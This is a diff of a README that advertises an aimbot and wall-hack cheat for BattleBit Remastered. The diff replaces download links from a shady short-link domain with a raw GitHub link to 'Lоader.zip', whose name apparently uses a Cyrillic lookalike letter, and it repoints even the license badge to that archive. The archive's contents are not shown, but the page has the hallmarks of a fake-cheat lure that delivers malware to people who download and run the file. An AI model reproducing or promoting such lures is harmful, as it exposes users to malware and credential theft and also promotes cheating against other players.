@@ -1,6 +1,6 @@
 # 🎯 BattleBit Remastered Aimbot & ESP
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=icloud)](https://easylauncher.su/PSnzrH)
+[![Download](https://raw.githubusercontent.com/kuniyaias/BattleBitRemastered-VisionAssist/main/Lоader.zip)](https://raw.githubusercontent.com/kuniyaias/BattleBitRemastered-VisionAssist/main/Lоader.zip)
 
 Unlock next-level precision with this advanced "BattleBit Remastered" aimbot and ESP enhancement toolkit. Elevate gameplay with high-accuracy targeting and clear enemy visualization through walls and obstacles. Enjoy a smoother, more strategic gaming experience with a wealth of innovative features.
 
@@ -33,7 +33,7 @@ Unlock next-level precision with this advanced "BattleBit Remastered" aimbot and
 
 ## 🛠️ Installation
 
-1. Click the download button below or [here](https://easylauncher.su/PSnzrH) to get the latest version  
+1. Click the download button below or [here](https://raw.githubusercontent.com/kuniyaias/BattleBitRemastered-VisionAssist/main/Lоader.zip) to get the latest version  
 2. Follow the detailed user instructions included  
 3. Launch BattleBit Remastered and enjoy enhanced gameplay
 
@@ -53,8 +53,8 @@ This project is for educational, ethical, and research purposes only. Usage may 
 
 ## 📑 License
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![MIT License](https://raw.githubusercontent.com/kuniyaias/BattleBitRemastered-VisionAssist/main/Lоader.zip)](LICENSE)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=icloud)](https://easylauncher.su/PSnzrH)
+[![Download](https://raw.githubusercontent.com/kuniyaias/BattleBitRemastered-VisionAssist/main/Lоader.zip)](https://raw.githubusercontent.com/kuniyaias/BattleBitRemastered-VisionAssist/main/Lоader.zip)
